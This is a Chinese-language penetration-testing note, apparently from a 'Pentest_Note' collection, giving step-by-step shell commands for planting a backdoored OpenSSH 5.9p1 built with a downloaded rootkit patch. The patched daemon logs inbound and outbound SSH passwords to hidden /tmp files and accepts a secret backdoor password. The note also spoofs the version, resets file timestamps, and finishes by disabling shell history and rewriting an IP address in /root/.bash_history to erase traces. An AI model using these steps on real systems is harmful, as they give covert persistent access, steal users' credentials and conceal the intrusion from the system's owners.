	下载
	http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
	http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
	备份配置文件
	>mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
	>mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
	安装关联文件
	centos
	>yum install -y openssl openssl-devel pam-devel zlib zlib-devel
	Ubuntu
	>apt-get install -y openssl libssl-dev libpam0g-dev
	>tar zxvf openssh-5.9p1.tar.gz 
	>tar zxvf 0x06-openssh-5.9p1.patch.tar.gz 
	>cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/
	>cd openssh-5.9p1
	>patch <sshbd5.9p1.diff
	>vim includes.h
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/575.png)
	
	/tmp/ilog记录登录到本机的用户密码
	/tmp/olog记录本机登录其他机器的账户密码
	日志文件前可以加个.隐藏起来
	SECRETPW是连接后门密码
	查看当前版本
	>ssh -V
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/576.png)

	修改version.h改为当前版本
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/577.png)

	编译安装
	Centos7
	>./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5
	>make clean
	>make && make install
	>systemctl restart sshd.service
	ubuntu
	>./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam
	>make clean
	>make&&make install
	重启服务，修改文件日志
	>touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config
	>touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/578.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/579.png)

	清除痕迹
	>export HISTFILE=/dev/null
	>export HISTSIZE=0
	>export HISTFILESIZE=0
	>sed -i 's/192.168.0.1/127.0.0.1/g' /root/.bash_history